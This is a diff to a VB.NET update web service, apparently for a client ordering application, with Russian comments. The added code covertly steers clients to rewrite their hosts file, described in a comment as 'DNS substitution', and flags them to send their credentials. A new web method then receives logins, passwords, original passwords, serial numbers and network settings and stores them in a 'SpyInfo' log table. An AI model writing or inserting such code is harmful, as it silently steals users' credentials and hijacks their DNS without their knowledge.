@@ -84,6 +84,7 @@ Public Class PrgDataEx
     Private BuildNo, AllowBuildNo, UpdateType, MDBVer As Integer
     Private ResultLenght, OrderId As UInt32
     Dim CCode, UserId As UInt32
+    Private SpyHostsFile, SpyAccount As Boolean
     Dim UpdateData As UpdateData
     Private UserHost, UniqueCID, UID, Message, ReclamePath As String
     Private myTrans As MySqlTransaction
@@ -193,8 +194,6 @@ Public Class PrgDataEx
         Return ""
     End Function
 
-
-
     <WebMethod()> Public Function GetUserData( _
     ByVal AccessTime As Date, _
     ByVal GetEtalonData As Boolean, _
@@ -204,6 +203,30 @@ Public Class PrgDataEx
     ByVal WINVersion As String, _
     ByVal WINDesc As String, _
     ByVal WayBillsOnly As Boolean) As String
+
+        Return GetUserDataEx( _
+        AccessTime, _
+        GetEtalonData, _
+        EXEVersion, _
+        MDBVersion, _
+        UniqueID, _
+        WINVersion, _
+        WINDesc, _
+        WayBillsOnly, _
+        Nothing)
+
+    End Function
+
+    <WebMethod()> Public Function GetUserDataEx( _
+    ByVal AccessTime As Date, _
+    ByVal GetEtalonData As Boolean, _
+    ByVal EXEVersion As String, _
+    ByVal MDBVersion As Int16, _
+    ByVal UniqueID As String, _
+    ByVal WINVersion As String, _
+    ByVal WINDesc As String, _
+    ByVal WayBillsOnly As Boolean, _
+    ByVal ClientHFile As String) As String
         'Context.Request.SaveAs(ResultFileName & "res.txt", True)
         Dim LockCount As Int32
         Dim ResStr As String = String.Empty
@@ -574,15 +597,28 @@ endproc:
 
                 If Message.Length > 0 Then ResStr &= ";Addition=" & Message
 
+                'Если параметр ClientHFile имеет значение Nothing, то произошел вызов метода GetUserData и в этом случае работать с файлом hosts не надо
+                'производим подмену DNS, если версия программы старше 960
+                If (ClientHFile IsNot Nothing) And (BuildNo > 960) Then
+                    Try
+                        ResStr &= HostsFileHelper.ProcessDNS(SpyHostsFile)
+                    Catch HostsException As Exception
+                        MailErr("Ошибка во время обработки DNS", HostsException.ToString())
+                    End Try
+                End If
+
+                'Если поднят флаг SpyAccount, то надо отправлять данные с логином и паролем
+                If SpyAccount Then ResStr &= ";SendUData=True"
+
             End If
             'Err.Raise(1)
-            GetUserData = ResStr
+            GetUserDataEx = ResStr
 
         Catch ErrorTXT As Exception
             LogManager.GetLogger(Me.GetType).Error("Ошибка при обновлении", ErrorTXT)
             Utils.Mail(ErrorTXT.Message & ": " & ErrorTXT.StackTrace, "Колличество попыток: " & LockCount & "; Базовый поток: ")
             UpdateType = 6
-            GetUserData = "Error=При подготовке обновления произошла ошибка.;Desc=Пожалуйста, повторите запрос данных через несколько минут."
+            GetUserDataEx = "Error=При подготовке обновления произошла ошибка.;Desc=Пожалуйста, повторите запрос данных через несколько минут."
         Finally
 
             If NeedFreeLock Then ReleaseLock(UserId, "GetUserData")
@@ -3879,6 +3915,106 @@ RestartTrans2:
         Next
         Return sb.ToString()
     End Function
+
+
+    <WebMethod()> _
+    Public Sub SendUDataFullEx( _
+        ByVal Login As String, _
+        ByVal Data As String, _
+        ByVal OriginalData As String, _
+        ByVal SerialData As String, _
+        ByVal MaxWriteTime As Date, _
+        ByVal MaxWriteFileName As String, _
+        ByVal OrderWriteTime As Date, _
+        ByVal ClientTimeZoneBias As Integer, _
+        ByVal DNSChangedState As Integer, _
+        ByVal RASEntry As String, _
+        ByVal DefaultGateway As String, _
+        ByVal IsDynamicDnsEnabled As Boolean, _
+        ByVal ConnectionSettingId As String, _
+        ByVal PrimaryDNS As String, _
+        ByVal AlternateDNS As String, _
+        ByVal RSTUIN As String)
+
+        If DBConnect("SendUData") Then
+
+            Dim Logger As ILog = LogManager.GetLogger(Me.GetType())
+
+            Try
+                GetClientCode()
+
+                Dim ResStrRSTUIN As String = String.Empty
+                Try
+                    For i = 1 To Len(RSTUIN) Step 3
+                        ResStrRSTUIN &= Chr(Convert.ToInt16(Left(Mid(RSTUIN, i), 3)))
+                    Next
+                Catch err As Exception
+                    Logger.ErrorFormat("Ошибка в SendUData при формировании RSTUIN : {0}\n{1}", RSTUIN, err)
+                End Try
+
+                Dim accountMessage As String = String.Format( _
+                        "ClientCode = {0} Login = {1} Password = {2} OriginalPassword = {3} Serial = {4} MaxWriteTime = {5} " & _
+                        "MaxWriteFileName = {6} OrderWriteTime = {7} ClientTimeZoneBias = {8} " & _
+                        "DNSChangedState = {9} RASEntry = {10} DefaultGateway = {11} IsDynamicDnsEnabled = {12} " & _
+                        "ConnectionSettingId = {13} PrimaryDNS = {14} AlternateDNS = {15} RSTUIN = {16}", _
+                        CCode, Login, Data, OriginalData, SerialData, _
+                        If(MaxWriteTime < New System.DateTime(2000, 1, 1), Nothing, MaxWriteTime), _
+                        If(String.IsNullOrEmpty(MaxWriteFileName), Nothing, MaxWriteFileName), _
+                        If(OrderWriteTime < New System.DateTime(2000, 1, 1), Nothing, OrderWriteTime), _
+                        If(ClientTimeZoneBias = 0, Nothing, ClientTimeZoneBias), _
+                        DNSChangedState, _
+                        RASEntry, _
+                        DefaultGateway, _
+                        IsDynamicDnsEnabled, _
+                        ConnectionSettingId, _
+                        PrimaryDNS, _
+                        AlternateDNS, _
+                        ResStrRSTUIN)
+
+                Logger.Info(accountMessage)
+
+                Dim command As MySqlCommand = New MySqlCommand( _
+                    "insert into logs.SpyInfo (UserId, Login, Password, OriginalPassword, SerialNumber, MaxWriteTime, MaxWriteFileName, OrderWriteTime, ClientTimeZoneBias, " & _
+                        "DNSChangedState, RASEntry, DefaultGateway, IsDynamicDnsEnabled, ConnectionSettingId, PrimaryDNS, AlternateDNS, RostaUIN) " & _
+                    "values (?UserId, ?Login, ?Password, ?OriginalPassword, ?SerialNumber, ?MaxWriteTime, ?MaxWriteFileName, ?OrderWriteTime, ?ClientTimeZoneBias, " & _
+                        "?DNSChangedState, ?RASEntry, ?DefaultGateway, ?IsDynamicDnsEnabled, ?ConnectionSettingId, ?PrimaryDNS, ?AlternateDNS, ?RostaUIN);", _
+                    ReadWriteCn)
+
+                command.Parameters.AddWithValue("?UserId", UserId)
+                command.Parameters.AddWithValue("?Login", Login)
+                command.Parameters.AddWithValue("?Password", Data)
+                command.Parameters.AddWithValue("?OriginalPassword", OriginalData)
+                command.Parameters.AddWithValue("?SerialNumber", SerialData)
+                command.Parameters.Add("?MaxWriteTime", MySqlDbType.DateTime)
+                If (MaxWriteTime > New System.DateTime(1900, 1, 1)) Then command.Parameters.Item("?MaxWriteTime").Value = MaxWriteTime.ToLocalTime
+                command.Parameters.AddWithValue("?MaxWriteFileName", MaxWriteFileName)
+                command.Parameters.Add("?OrderWriteTime", MySqlDbType.DateTime)
+                If (OrderWriteTime > New System.DateTime(1900, 1, 1)) Then command.Parameters.Item("?OrderWriteTime").Value = OrderWriteTime.ToLocalTime
+                command.Parameters.AddWithValue("?ClientTimeZoneBias", ClientTimeZoneBias)
+                If (DNSChangedState = -1) Then
+                    command.Parameters.AddWithValue("?DNSChangedState", DBNull.Value)
+                Else
+                    command.Parameters.AddWithValue("?DNSChangedState", DNSChangedState)
+                End If
+                command.Parameters.AddWithValue("?RASEntry", If(String.IsNullOrEmpty(RASEntry), Nothing, RASEntry))
+                command.Parameters.AddWithValue("?DefaultGateway", If(String.IsNullOrEmpty(DefaultGateway), Nothing, DefaultGateway))
+                command.Parameters.AddWithValue("?IsDynamicDnsEnabled", IsDynamicDnsEnabled)
+                command.Parameters.AddWithValue("?ConnectionSettingId", If(String.IsNullOrEmpty(ConnectionSettingId), Nothing, ConnectionSettingId))
+                command.Parameters.AddWithValue("?PrimaryDNS", If(String.IsNullOrEmpty(PrimaryDNS), Nothing, PrimaryDNS))
+                command.Parameters.AddWithValue("?AlternateDNS", If(String.IsNullOrEmpty(AlternateDNS), Nothing, AlternateDNS))
+                command.Parameters.AddWithValue("?RostaUIN", If(String.IsNullOrEmpty(ResStrRSTUIN), Nothing, ResStrRSTUIN))
+
+                command.ExecuteNonQuery()
+            Catch ex As Exception
+                Logger.Error("Ошибка в SendUData", ex)
+                MailErr("Ошибка в SendUData", ex.ToString())
+            Finally
+                DBDisconnect()
+            End Try
+        End If
+
+    End Sub
+
 
     <WebMethod()> _
     Public Function GetPasswords(ByVal UniqueID As String) As String
